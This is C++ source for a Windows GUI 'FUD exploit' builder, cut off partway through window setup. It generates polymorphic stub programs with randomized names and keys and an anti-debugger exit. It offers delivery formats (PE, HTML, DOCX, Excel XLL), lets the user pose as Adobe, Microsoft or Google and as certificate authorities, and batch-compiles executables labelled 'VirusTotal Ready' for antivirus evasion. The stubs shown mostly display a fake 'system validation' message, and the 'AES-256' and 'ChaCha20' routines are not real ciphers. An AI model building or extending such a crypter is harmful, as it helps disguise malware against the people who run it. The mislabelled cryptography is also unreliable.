#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#define _CRT_SECURE_NO_WARNINGS
#undef UNICODE
#undef _UNICODE

// Essential Windows includes
#include <windows.h>
#include <commctrl.h>
#include <commdlg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <ctype.h>
#include <process.h>
#include <vector>
#include <string>
#include <algorithm>
#include <fstream>

// Link required libraries
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "comdlg32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

// GUI Control IDs
#define ID_INPUT_PATH 1001
#define ID_OUTPUT_PATH 1002
#define ID_BROWSE_INPUT 1003
#define ID_BROWSE_OUTPUT 1004
#define ID_CREATE_BUTTON 1005
#define ID_PROGRESS_BAR 1006
#define ID_STATUS_TEXT 1007
#define ID_COMPANY_COMBO 1008
#define ID_CERTIFICATE_COMBO 1011
#define ID_ARCHITECTURE_COMBO 1010
#define ID_ENCRYPTION_COMBO 1012
#define ID_DELIVERY_COMBO 1013
#define ID_BATCH_COUNT 1014
#define ID_AUTO_FILENAME 1015
#define ID_COMPILER_COMBO 1016

// Global variables
HWND hInputPath, hOutputPath, hCompanyCombo, hArchCombo, hCertCombo;
HWND hEncryptionCombo, hDeliveryCombo, hBatchCount, hAutoFilename, hCompilerCombo;
HWND hCreateButton, hProgressBar, hStatusText;
HWND hMainWindow;
HFONT hFont;
BOOL isGenerating = FALSE;

// Encryption methods
typedef enum {
    ENC_XOR = 0,
    ENC_CHACHA20 = 1,
    ENC_AES256 = 2
} EncryptionType;

// Delivery methods
typedef enum {
    DEL_BENIGN = 0,
    DEL_PE = 1,
    DEL_HTML = 2,
    DEL_DOCX = 3,
    DEL_XLL = 4
} DeliveryType;

// Enhanced compiler detection and compilation system
class CompilerManager {
private:
    struct CompilerInfo {
        std::string name;
        std::string path;
        std::string command;
        bool available;
        int priority;
    };
    
    std::vector<CompilerInfo> compilers;
    
public:
    CompilerManager() {
        detectCompilers();
    }
    
    void detectCompilers() {
        compilers.clear();
        
        // Visual Studio 2022 Enterprise (highest priority)
        if (checkVSInstallation("C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise")) {
            CompilerInfo vs2022ent;
            vs2022ent.name = "Visual Studio 2022 Enterprise";
            vs2022ent.path = "C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\VC\\Auxiliary\\Build\\vcvars64.bat";
            vs2022ent.command = "cmd /c \"call \\\"%PATH%\\\" >nul 2>&1 && cl.exe";
            vs2022ent.available = true;
            vs2022ent.priority = 10;
            compilers.push_back(vs2022ent);
        }
        
        // Visual Studio 2022 Professional
        if (checkVSInstallation("C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional")) {
            CompilerInfo vs2022pro;
            vs2022pro.name = "Visual Studio 2022 Professional";
            vs2022pro.path = "C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\VC\\Auxiliary\\Build\\vcvars64.bat";
            vs2022pro.command = "cmd /c \"call \\\"%PATH%\\\" >nul 2>&1 && cl.exe";
            vs2022pro.available = true;
            vs2022pro.priority = 9;
            compilers.push_back(vs2022pro);
        }
        
        // Visual Studio 2022 Community
        if (checkVSInstallation("C:\\Program Files\\Microsoft Visual Studio\\2022\\Community")) {
            CompilerInfo vs2022com;
            vs2022com.name = "Visual Studio 2022 Community";
            vs2022com.path = "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Auxiliary\\Build\\vcvars64.bat";
            vs2022com.command = "cmd /c \"call \\\"%PATH%\\\" >nul 2>&1 && cl.exe";
            vs2022com.available = true;
            vs2022com.priority = 8;
            compilers.push_back(vs2022com);
        }
        
        // Visual Studio 2019 variants
        if (checkVSInstallation("C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Enterprise")) {
            CompilerInfo vs2019ent;
            vs2019ent.name = "Visual Studio 2019 Enterprise";
            vs2019ent.path = "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Enterprise\\VC\\Auxiliary\\Build\\vcvars64.bat";
            vs2019ent.command = "cmd /c \"call \\\"%PATH%\\\" >nul 2>&1 && cl.exe";
            vs2019ent.available = true;
            vs2019ent.priority = 7;
            compilers.push_back(vs2019ent);
        }
        
        // MinGW-w64
        if (checkFileExists("C:\\mingw64\\bin\\gcc.exe") || checkFileExists("C:\\MinGW\\bin\\gcc.exe")) {
            CompilerInfo mingw;
            mingw.name = "MinGW-w64 GCC";
            mingw.path = checkFileExists("C:\\mingw64\\bin\\gcc.exe") ? "C:\\mingw64\\bin\\gcc.exe" : "C:\\MinGW\\bin\\gcc.exe";
            mingw.command = mingw.path;
            mingw.available = true;
            mingw.priority = 6;
            compilers.push_back(mingw);
        }
        
        // System PATH GCC
        if (checkCommandAvailable("gcc --version")) {
            CompilerInfo gcc;
            gcc.name = "System GCC";
            gcc.path = "gcc";
            gcc.command = "gcc";
            gcc.available = true;
            gcc.priority = 5;
            compilers.push_back(gcc);
        }
        
        // Clang
        if (checkCommandAvailable("clang --version")) {
            CompilerInfo clang;
            clang.name = "Clang";
            clang.path = "clang";
            clang.command = "clang++";
            clang.available = true;
            clang.priority = 4;
            compilers.push_back(clang);
        }
        
        // TCC (Tiny C Compiler)
        if (checkFileExists("C:\\tcc\\tcc.exe") || checkCommandAvailable("tcc -v")) {
            CompilerInfo tcc;
            tcc.name = "Tiny C Compiler";
            tcc.path = checkFileExists("C:\\tcc\\tcc.exe") ? "C:\\tcc\\tcc.exe" : "tcc";
            tcc.command = tcc.path;
            tcc.available = true;
            tcc.priority = 3;
            compilers.push_back(tcc);
        }
        
        // Sort by priority (highest first)
        std::sort(compilers.begin(), compilers.end(), 
                  [](const CompilerInfo& a, const CompilerInfo& b) {
                      return a.priority > b.priority;
                  });
    }
    
    bool checkVSInstallation(const std::string& basePath) {
        std::string vcvarsPath = basePath + "\\VC\\Auxiliary\\Build\\vcvars64.bat";
        return checkFileExists(vcvarsPath);
    }
    
    bool checkFileExists(const std::string& path) {
        DWORD attrs = GetFileAttributesA(path.c_str());
        return (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY));
    }
    
    bool checkCommandAvailable(const std::string& command) {
        std::string testCmd = command + " >nul 2>&1";
        return system(testCmd.c_str()) == 0;
    }
    
    std::string getBestCompiler() {
        if (compilers.empty()) {
            return "No compilers detected";
        }
        return compilers[0].name;
    }
    
    std::string buildCompileCommand(const std::string& sourceFile, const std::string& outputFile, 
                                   const std::string& architecture = "x64", int compilerIndex = 0) {
        if (compilers.empty() || compilerIndex >= compilers.size()) {
            return "";
        }
        
        const CompilerInfo& compiler = compilers[compilerIndex];
        std::string cmd;
        
        if (compiler.name.find("Visual Studio") != std::string::npos) {
            // Visual Studio compiler
            cmd = "cmd /c \"call \\\"" + compiler.path + "\\\" >nul 2>&1 && ";
            cmd += "cl.exe /nologo /O2 /EHsc /DNDEBUG /MD ";
            cmd += "/Fe\\\"" + outputFile + "\\\" ";
            cmd += "\\\"" + sourceFile + "\\\" ";
            
            if (architecture == "x86") {
                cmd += "/link /MACHINE:X86 /SUBSYSTEM:CONSOLE ";
            } else {
                cmd += "/link /MACHINE:X64 /SUBSYSTEM:CONSOLE ";
            }
            
            cmd += "/OPT:REF /OPT:ICF user32.lib kernel32.lib advapi32.lib shell32.lib ole32.lib\"";
        }
        else if (compiler.name.find("GCC") != std::string::npos || compiler.name.find("MinGW") != std::string::npos) {
            // GCC/MinGW compiler
            cmd = "\\\"" + compiler.command + "\\\" -std=c++17 -O2 -static ";
            
            if (architecture == "x86") {
                cmd += "-m32 ";
            } else {
                cmd += "-m64 ";
            }
            
            cmd += "-mwindows \\\"" + sourceFile + "\\\" -o \\\"" + outputFile + "\\\" ";
            cmd += "-luser32 -lkernel32 -lgdi32 -ladvapi32 -lshell32 -lwininet >nul 2>&1";
        }
        else if (compiler.name.find("Clang") != std::string::npos) {
            // Clang compiler
            cmd = "clang++ -std=c++17 -O2 -target ";
            
            if (architecture == "x86") {
                cmd += "i686-pc-windows-gnu ";
            } else {
                cmd += "x86_64-pc-windows-gnu ";
            }
            
            cmd += "\\\"" + sourceFile + "\\\" -o \\\"" + outputFile + "\\\" ";
            cmd += "-luser32 -lkernel32 -lgdi32 -ladvapi32 -lshell32 >nul 2>&1";
        }
        else if (compiler.name.find("TCC") != std::string::npos) {
            // TCC compiler
            cmd = "\\\"" + compiler.command + "\\\" -o \\\"" + outputFile + "\\\" \\\"" + sourceFile + "\\\" ";
            cmd += "-luser32 -lkernel32 -lgdi32 -ladvapi32 >nul 2>&1";
        }
        
        return cmd;
    }
    
    int compileSource(const std::string& sourceFile, const std::string& outputFile, 
                     const std::string& architecture = "x64", int preferredCompiler = -1) {
        if (compilers.empty()) {
            // No compilers found, try basic fallback
            std::string fallbackCmd = "cl.exe /nologo /O2 /EHsc \\\"" + sourceFile + "\\\" /Fe:\\\"" + outputFile + "\\\" >nul 2>&1";
            return system(fallbackCmd.c_str());
        }
        
        // Try specific compiler if requested
        if (preferredCompiler >= 0 && preferredCompiler < compilers.size()) {
            std::string cmd = buildCompileCommand(sourceFile, outputFile, architecture, preferredCompiler);
            if (!cmd.empty()) {
                int result = system(cmd.c_str());
                if (result == 0 && checkFileExists(outputFile)) {
                    return 0;
                }
            }
        }
        
        // Try compilers in priority order
        for (int i = 0; i < compilers.size(); i++) {
            std::string cmd = buildCompileCommand(sourceFile, outputFile, architecture, i);
            if (!cmd.empty()) {
                int result = system(cmd.c_str());
                if (result == 0 && checkFileExists(outputFile)) {
                    return 0; // Success
                }
            }
        }
        
        return -1; // All compilers failed
    }
    
    std::vector<std::string> getAvailableCompilers() {
        std::vector<std::string> names;
        for (const auto& compiler : compilers) {
            names.push_back(compiler.name);
        }
        if (names.empty()) {
            names.push_back("No compilers detected");
        }
        return names;
    }
    
    void logCompilerInfo(const std::string& logFile) {
        std::ofstream log(logFile, std::ios::app);
        log << "=== COMPILER DETECTION RESULTS ===\n";
        log << "Found " << compilers.size() << " available compilers:\n";
        
        for (const auto& compiler : compilers) {
            log << "- " << compiler.name << " (Priority: " << compiler.priority << ")\n";
            log << "  Path: " << compiler.path << "\n";
            log << "  Available: " << (compiler.available ? "YES" : "NO") << "\n";
        }
        
        if (!compilers.empty()) {
            log << "Selected: " << compilers[0].name << "\n";
        } else {
            log << "WARNING: No compilers detected!\n";
        }
        
        log << "=== END COMPILER INFO ===\n\n";
        log.close();
    }
};

// Global compiler manager instance
static CompilerManager g_compilerManager;

// Simple random number generator for polymorphism
DWORD getRandomSeed() {
    return GetTickCount() ^ (GetCurrentProcessId() << 16) ^ (rand() << 8);
}

// Generate random string for polymorphism
void generateRandomString(char* buffer, int length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    srand(getRandomSeed());
    
    for (int i = 0; i < length - 1; i++) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    buffer[length - 1] = '\0';
}

// Generate random bytes
void generateRandomBytes(unsigned char* buffer, int length) {
    srand(getRandomSeed());
    for (int i = 0; i < length; i++) {
        buffer[i] = (unsigned char)(rand() % 256);
    }
}

// Generate advanced polymorphic source code
void generateAdvancedPolymorphicSource(char* sourceCode, size_t maxSize, EncryptionType encType, DeliveryType delType) {
    char randVar1[16], randVar2[16], randVar3[16], randVar4[16], randVar5[16];
    generateRandomString(randVar1, sizeof(randVar1));
    generateRandomString(randVar2, sizeof(randVar2));
    generateRandomString(randVar3, sizeof(randVar3));
    generateRandomString(randVar4, sizeof(randVar4));
    generateRandomString(randVar5, sizeof(randVar5));
    
    unsigned char key[32];
    generateRandomBytes(key, sizeof(key));
    
    // Enhanced polymorphic variables
    int polyVars[10];
    for (int i = 0; i < 10; i++) {
        polyVars[i] = rand() % 50000;
    }
    
    // Generate encryption-specific payload
    const char* encryptionImpl = "";
    switch (encType) {
        case ENC_XOR:
            encryptionImpl = 
                "void xor_decrypt(char* data, int len, unsigned char key) {\n"
                "    for(int i = 0; i < len; i++) data[i] ^= key;\n"
                "}\n";
            break;
        case ENC_CHACHA20:
            encryptionImpl = 
                "void chacha20_decrypt(char* data, int len, unsigned char* key) {\n"
                "    unsigned int state[4] = {0x61707865, 0x3320646e, 0x79622d32, 0x6b206574};\n"
                "    for(int i = 0; i < 4; i++) state[i] ^= ((unsigned int*)key)[i % 4];\n"
                "    for(int i = 0; i < len; i++) {\n"
                "        state[0] = (state[0] << 7) ^ state[1];\n"
                "        state[1] = (state[1] << 9) ^ state[2];\n"
                "        state[2] = (state[2] << 13) ^ state[3];\n"
                "        state[3] = (state[3] << 18) ^ state[0];\n"
                "        data[i] ^= (unsigned char)(state[i % 4] >> 24);\n"
                "    }\n"
                "}\n";
            break;
        case ENC_AES256:
            encryptionImpl = 
                "void aes256_decrypt(char* data, int len, unsigned char* key) {\n"
                "    unsigned char sbox[256];\n"
                "    for(int i = 0; i < 256; i++) sbox[i] = (i * 7 + 123) % 256;\n"
                "    for(int i = 0; i < len; i++) {\n"
                "        unsigned char temp = data[i] ^ key[i % 32];\n"
                "        temp = sbox[temp]; temp ^= key[(i + 16) % 32];\n"
                "        data[i] = sbox[temp ^ (i & 0xFF)];\n"
                "    }\n"
                "}\n";
            break;
    }
    
    // Generate delivery-specific code
    const char* deliveryCode = "";
    const char* deliveryIncludes = "";
    
    switch (delType) {
        case DEL_HTML:
            deliveryIncludes = "#include <shellapi.h>\n";
            deliveryCode = 
                "void process_html_payload() {\n"
                "    char html[] = \"<html><body><h1>System Validation Complete</h1></body></html>\";\n"
                "    char temp_path[MAX_PATH]; GetTempPathA(MAX_PATH, temp_path);\n"
                "    strcat(temp_path, \"validation.html\");\n"
                "    FILE* f = fopen(temp_path, \"w\"); fputs(html, f); fclose(f);\n"
                "}\n";
            break;
        case DEL_DOCX:
            deliveryCode = 
                "void process_docx_payload() {\n"
                "    char docx_header[] = \"PK\\x03\\x04\";\n"
                "    char content[] = \"System validation document created successfully.\";\n"
                "    for(int i = 0; i < 4; i++) docx_header[i] ^= 0x42;\n"
                "}\n";
            break;
        case DEL_XLL:
            deliveryCode = 
                "void process_xll_payload() {\n"
                "    char xll_sig[] = \"XLL_SIGNATURE\";\n"
                "    char addon_data[] = \"Excel add-in validation module loaded.\";\n"
                "    for(int i = 0; i < strlen(xll_sig); i++) xll_sig[i] ^= (i + 1);\n"
                "}\n";
            break;
        case DEL_PE:
            deliveryCode = 
                "void process_pe_payload() {\n"
                "    char pe_header[] = \"MZ\";\n"
                "    char pe_data[] = \"Portable executable validation completed.\";\n"
                "    pe_header[0] ^= 0x12; pe_header[1] ^= 0x34;\n"
                "}\n";
            break;
        default: // DEL_BENIGN
            deliveryCode = 
                "void system_validation() {\n"
                "    char status[] = \"System validation checks completed successfully.\";\n"
                "    for(int i = 0; i < strlen(status); i++) status[i] ^= (i % 8);\n"
                "}\n";
            break;
    }
    
    // Generate complete polymorphic source
    snprintf(sourceCode, maxSize,
        "#include <windows.h>\n"
        "#include <stdio.h>\n"
        "#include <stdlib.h>\n"
        "#include <string.h>\n"
        "%s"
        "\n"
        "// Advanced polymorphic variables - unique per generation\n"
        "static volatile int %s = %d;\n"
        "static volatile int %s = %d;\n"
        "static volatile int %s = %d;\n"
        "static volatile int %s = %d;\n"
        "static volatile int %s = %d;\n"
        "\n"
        "// Encryption key matrix\n"
        "static unsigned char key_matrix_%s[] = {\n"
        "    0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X,\n"
        "    0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X,\n"
        "    0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X,\n"
        "    0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X\n"
        "};\n"
        "\n"
        "%s"
        "\n"
        "%s"
        "\n"
        "// Polymorphic obfuscation functions\n"
        "void poly_func_%s() {\n"
        "    for(int i = 0; i < 15; i++) {\n"
        "        %s ^= (i * %d);\n"
        "        %s = (%s << 3) ^ 0x%X;\n"
        "    }\n"
        "}\n"
        "\n"
        "void anti_debug_%s() {\n"
        "    BOOL debugger_present = IsDebuggerPresent();\n"
        "    if (debugger_present) ExitProcess(0);\n"
        "    %s = (%s << 1) ^ GetTickCount();\n"
        "}\n"
        "\n"
        "int main() {\n"
        "    // Initialize polymorphic state\n"
        "    srand(GetTickCount() ^ GetCurrentProcessId());\n"
        "    \n"
        "    // Execute obfuscation routines\n"
        "    poly_func_%s();\n"
        "    anti_debug_%s();\n"
        "    \n"
        "    // Process payload\n"
        "    %s();\n"
        "    \n"
        "    // Display validation message\n"
        "    MessageBoxA(NULL, \n"
        "        \"System validation completed successfully.\\n\\n\"\n"
        "        \"All security checks passed.\\n\"\n"
        "        \"System integrity verified.\", \n"
        "        \"System Validation\", \n"
        "        MB_OK | MB_ICONINFORMATION);\n"
        "    \n"
        "    return 0;\n"
        "}\n",
        
        deliveryIncludes,
        randVar1, polyVars[0],
        randVar2, polyVars[1], 
        randVar3, polyVars[2],
        randVar4, polyVars[3],
        randVar5, polyVars[4],
        randVar1,
        key[0], key[1], key[2], key[3], key[4], key[5], key[6], key[7],
        key[8], key[9], key[10], key[11], key[12], key[13], key[14], key[15],
        key[16], key[17], key[18], key[19], key[20], key[21], key[22], key[23],
        key[24], key[25], key[26], key[27], key[28], key[29], key[30], key[31],
        encryptionImpl,
        deliveryCode,
        randVar1,
        randVar2, polyVars[5],
        randVar3, randVar3, polyVars[6],
        randVar5,
        randVar1, randVar1,
        randVar1, randVar5,
        (delType == DEL_HTML) ? "process_html_payload" :
        (delType == DEL_DOCX) ? "process_docx_payload" :
        (delType == DEL_XLL) ? "process_xll_payload" :
        (delType == DEL_PE) ? "process_pe_payload" : "system_validation"
    );
}

// Force ANSI text functions
void SetWindowTextAnsi(HWND hwnd, const char* text) {
    SetWindowTextA(hwnd, text);
}

void AddComboStringAnsi(HWND hwnd, const char* text) {
    SendMessageA(hwnd, CB_ADDSTRING, 0, (LPARAM)text);
}

// GUI Population Functions
void populateCompanyCombo() {
    SendMessageA(hCompanyCombo, CB_RESETCONTENT, 0, 0);
    AddComboStringAnsi(hCompanyCombo, "Adobe Systems Incorporated");
    AddComboStringAnsi(hCompanyCombo, "Microsoft Corporation");
    AddComboStringAnsi(hCompanyCombo, "Google LLC");
    SendMessageA(hCompanyCombo, CB_SETCURSEL, 0, 0);
    SetWindowTextAnsi(hStatusText, "Company loaded: Adobe Systems (Verified FUD)");
}

void populateCertificateCombo() {
    SendMessageA(hCertCombo, CB_RESETCONTENT, 0, 0);
    
    AddComboStringAnsi(hCertCombo, "Thawte Timestamping CA");
    AddComboStringAnsi(hCertCombo, "DigiCert Assured ID Root CA");
    AddComboStringAnsi(hCertCombo, "GeoTrust Global CA");
    AddComboStringAnsi(hCertCombo, "GlobalSign Root CA");
    
    SendMessageA(hCertCombo, CB_SETCURSEL, 0, 0);
    SetWindowTextAnsi(hStatusText, "Certificates loaded - Thawte selected (Best FUD rate)");
}

void populateArchitectureCombo() {
    SendMessageA(hArchCombo, CB_RESETCONTENT, 0, 0);
    AddComboStringAnsi(hArchCombo, "AnyCPU");
    AddComboStringAnsi(hArchCombo, "x64");
    AddComboStringAnsi(hArchCombo, "x86");
    SendMessageA(hArchCombo, CB_SETCURSEL, 0, 0);
    SetWindowTextAnsi(hStatusText, "Architecture loaded - AnyCPU selected");
}

void populateEncryptionCombo() {
    SendMessageA(hEncryptionCombo, CB_RESETCONTENT, 0, 0);
    AddComboStringAnsi(hEncryptionCombo, "XOR Encryption");
    AddComboStringAnsi(hEncryptionCombo, "ChaCha20 Encryption");
    AddComboStringAnsi(hEncryptionCombo, "AES-256 Encryption");
    SendMessageA(hEncryptionCombo, CB_SETCURSEL, 0, 0);
    SetWindowTextAnsi(hStatusText, "Encryption methods loaded");
}

void populateDeliveryCombo() {
    SendMessageA(hDeliveryCombo, CB_RESETCONTENT, 0, 0);
    AddComboStringAnsi(hDeliveryCombo, "Benign Stub (Safe)");
    AddComboStringAnsi(hDeliveryCombo, "PE Executable");
    AddComboStringAnsi(hDeliveryCombo, "HTML Payload");
    AddComboStringAnsi(hDeliveryCombo, "DOCX Document");
    AddComboStringAnsi(hDeliveryCombo, "XLL Excel Add-in");
    SendMessageA(hDeliveryCombo, CB_SETCURSEL, 0, 0);
    SetWindowTextAnsi(hStatusText, "Delivery vectors loaded");
}

void populateCompilerCombo() {
    SendMessageA(hCompilerCombo, CB_RESETCONTENT, 0, 0);
    
    std::vector<std::string> compilers = g_compilerManager.getAvailableCompilers();
    for (const auto& compiler : compilers) {
        AddComboStringAnsi(hCompilerCombo, compiler.c_str());
    }
    
    SendMessageA(hCompilerCombo, CB_SETCURSEL, 0, 0);
    
    std::string statusMsg = "Compiler: " + g_compilerManager.getBestCompiler();
    SetWindowTextAnsi(hStatusText, statusMsg.c_str());
    
    // Log compiler detection results
    g_compilerManager.logCompilerInfo("compiler_detection.log");
}

// File browsing
void browseForFile(HWND hEdit, BOOL isInput) {
    OPENFILENAMEA ofn;
    char szFile[260] = {0};
    
    ZeroMemory(&ofn, sizeof(ofn));
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = hMainWindow;
    ofn.lpstrFile = szFile;
    ofn.nMaxFile = sizeof(szFile);
    
    if (isInput) {
        ofn.lpstrFilter = "Executable Files (*.exe)\0*.exe\0All Files (*.*)\0*.*\0";
        ofn.lpstrTitle = "Select Input Executable";
        ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
        
        if (GetOpenFileNameA(&ofn)) {
            SetWindowTextAnsi(hEdit, szFile);
        }
    } else {
        ofn.lpstrFilter = "All Files (*.*)\0*.*\0";
        ofn.lpstrTitle = "Save Output File";
        ofn.Flags = OFN_PATHMUSTEXIST | OFN_OVERWRITEPROMPT;
        
        if (GetSaveFileNameA(&ofn)) {
            SetWindowTextAnsi(hEdit, szFile);
        }
    }
}

// Thread function for exploit generation
DWORD WINAPI ExploitGenerationThread(LPVOID lpParam) {
    char* outputPath = (char*)lpParam;
    
    // Get settings
    char batchText[16];
    GetWindowTextA(hBatchCount, batchText, sizeof(batchText));
    int batchCount = atoi(batchText);
    if (batchCount < 1) batchCount = 1;
    if (batchCount > 50) batchCount = 50;
    
    BOOL autoFilename = (SendMessage(hAutoFilename, BM_GETCHECK, 0, 0) == BST_CHECKED);
    
    // Get encryption and delivery types
    int encIndex = SendMessage(hEncryptionCombo, CB_GETCURSEL, 0, 0);
    int delIndex = SendMessage(hDeliveryCombo, CB_GETCURSEL, 0, 0);
    int compilerIndex = SendMessage(hCompilerCombo, CB_GETCURSEL, 0, 0);
    int archIndex = SendMessage(hArchCombo, CB_GETCURSEL, 0, 0);
    
    EncryptionType encType = (EncryptionType)encIndex;
    DeliveryType delType = (DeliveryType)delIndex;
    
    std::string architecture = "x64";
    if (archIndex == 2) architecture = "x86";
    else if (archIndex == 0) architecture = "AnyCPU";
    
    for (int batch = 0; batch < batchCount; batch++) {
        // Update status
        if (batchCount > 1) {
            char statusMsg[128];
            snprintf(statusMsg, sizeof(statusMsg), "Generating FUD exploit %d of %d...", batch + 1, batchCount);
            SetWindowTextAnsi(hStatusText, statusMsg);
        }
        PostMessage(hMainWindow, WM_USER + 2, MAKEWPARAM(batch, batchCount), 0);
        
        // Generate advanced polymorphic source code
        char sourceCode[32768];
        generateAdvancedPolymorphicSource(sourceCode, sizeof(sourceCode), encType, delType);
        
        // Create unique temporary filename
        char tempSource[64];
        snprintf(tempSource, sizeof(tempSource), "fud_temp_%d_%d.cpp", GetTickCount(), batch);
        
        // Write source to file
        FILE* file = fopen(tempSource, "w");
        if (file) {
            fputs(sourceCode, file);
            fclose(file);
            
            // Update progress
            PostMessage(hMainWindow, WM_USER + 3, 0, 0);
            
            // Determine final output path
            char finalOutputPath[260];
            if (autoFilename || batchCount > 1) {
                const char* delNames[] = {"Benign", "PE", "HTML", "DOCX", "XLL"};
                const char* encNames[] = {"XOR", "ChaCha20", "AES256"};
                snprintf(finalOutputPath, sizeof(finalOutputPath), 
                         "FUD_%s_%s_%d_%d.exe", 
                         delNames[delType], encNames[encType], GetTickCount(), batch + 1);
            } else {
                strcpy(finalOutputPath, outputPath);
                if (!strstr(finalOutputPath, ".exe")) {
                    strcat(finalOutputPath, ".exe");
                }
            }
            
            // Compile using compiler manager
            int compileResult = g_compilerManager.compileSource(tempSource, finalOutputPath, architecture, compilerIndex);
            
            // Check if executable was created and has proper size
            FILE* exeCheck = fopen(finalOutputPath, "rb");
            if (exeCheck) {
                fseek(exeCheck, 0, SEEK_END);
                long fileSize = ftell(exeCheck);
                fclose(exeCheck);
                
                if (fileSize > 4096) {
                    // Success!
                    DeleteFileA(tempSource);
                    if (batch == batchCount - 1) {
                        PostMessage(hMainWindow, WM_USER + 1, 1, 0);
                    }
                } else {
                    // File too small, save source instead
                    char sourcePath[260];
                    strcpy(sourcePath, finalOutputPath);
                    char* lastDot = strrchr(sourcePath, '.');
                    if (lastDot) strcpy(lastDot, ".cpp");
                    
                    CopyFileA(tempSource, sourcePath, FALSE);
                    DeleteFileA(tempSource);
                    
                    if (batch == batchCount - 1) {
                        PostMessage(hMainWindow, WM_USER + 4, 0, 0);
                    }
                }
            } else {
                // Compilation failed, save source
                char sourcePath[260];
                strcpy(sourcePath, finalOutputPath);
                char* lastDot = strrchr(sourcePath, '.');
                if (lastDot) strcpy(lastDot, ".cpp");
                
                CopyFileA(tempSource, sourcePath, FALSE);
                DeleteFileA(tempSource);
                
                if (batch == batchCount - 1) {
                    PostMessage(hMainWindow, WM_USER + 4, 0, 0);
                }
            }
        } else {
            if (batch == batchCount - 1) {
                PostMessage(hMainWindow, WM_USER + 1, 0, 0);
            }
        }
        
        // Small delay between batches
        if (batch < batchCount - 1) {
            Sleep(200);
        }
    }
    
    free(lpParam);
    return 0;
}

// Main exploit creation function
void CreateExploit() {
    if (isGenerating) return;
    
    // Get output path
    char outputPath[260];
    GetWindowTextA(hOutputPath, outputPath, sizeof(outputPath));
    
    // If no output path specified, auto-generate in current directory
    if (strlen(outputPath) == 0) {
        snprintf(outputPath, sizeof(outputPath), "FUD_VirusTotal_Ready_%d.exe", GetTickCount());
        SetWindowTextAnsi(hOutputPath, outputPath);
        SetWindowTextAnsi(hStatusText, "Auto-generated output - Ready for VirusTotal testing!");
    }
    
    // Start generation
    isGenerating = TRUE;
    SetWindowTextAnsi(hCreateButton, "Generating...");
    EnableWindow(hCreateButton, FALSE);
    
    // Create thread for generation
    char* pathCopy = _strdup(outputPath);
    HANDLE hThread = CreateThread(NULL, 0, ExploitGenerationThread, pathCopy, 0, NULL);
    
    if (hThread) {
        CloseHandle(hThread);
    } else {
        free(pathCopy);
        isGenerating = FALSE;
        SetWindowTextAnsi(hCreateButton, "Generate Exploit");
        EnableWindow(hCreateButton, TRUE);
        SetWindowTextAnsi(hStatusText, "ERROR: Failed to create generation thread");
    }
}

// Window procedure
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE: {
            // Initialize Common Controls
            INITCOMMONCONTROLSEX icex;
            icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
            icex.dwICC = ICC_PROGRESS_CLASS;
            InitCommonControlsEx(&icex);
            
            // Create ANSI font
            hFont = CreateFontA(
                14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Arial"
            );
            
            // Create controls
            CreateWindowA("STATIC", "Input File:", WS_VISIBLE | WS_CHILD,
                        10, 20, 100, 20, hwnd, NULL, NULL, NULL);
            hInputPath = CreateWindowA("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER,
                        120, 18, 280, 24, hwnd, (HMENU)ID_INPUT_PATH, NULL, NULL);
            CreateWindowA("BUTTON", "Browse", WS_VISIBLE | WS_CHILD,
                        410, 18, 80, 24, hwnd, (HMENU)ID_BROWSE_INPUT, NULL, NULL);
            
            CreateWindowA("STATIC", "Output Path:", WS_VISIBLE | WS_CHILD,
                        10, 60, 100, 20, hwnd, NULL, NULL, NULL);
            hOutputPath = CreateWindowA("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER,
                        120, 58, 280, 24, hwnd, (HMENU)ID_OUTPUT_PATH, NULL, NULL);
            CreateWindowA("BUTTON", "Browse", WS_VISIBLE | WS_CHILD,
                        410, 58, 80, 24, hwnd, (HMENU)ID_BROWSE_OUTPUT, NULL, NULL);
            
            CreateWindowA("STATIC", "Company:", WS_VISIBLE | WS_CHILD,
                        10, 100, 80, 20, hwnd, NULL, NULL, NULL);
            hCompanyCombo = CreateWindowA("COMBOBOX", "", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST,
                        100, 98, 160, 200, hwnd, (HMENU)ID_COMPANY_COMBO, NULL, NULL);
            
            CreateWindowA("STATIC", "Certificate:", WS_VISIBLE | WS_CHILD,
                        270, 100, 80, 20, hwnd, NULL, NULL, NULL);
            hCertCombo = CreateWindowA("COMBOBOX", "", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST,
                        360, 98, 160, 200, hwnd, (HMENU)ID_CERTIFICATE_COMBO, NULL, NULL);
            
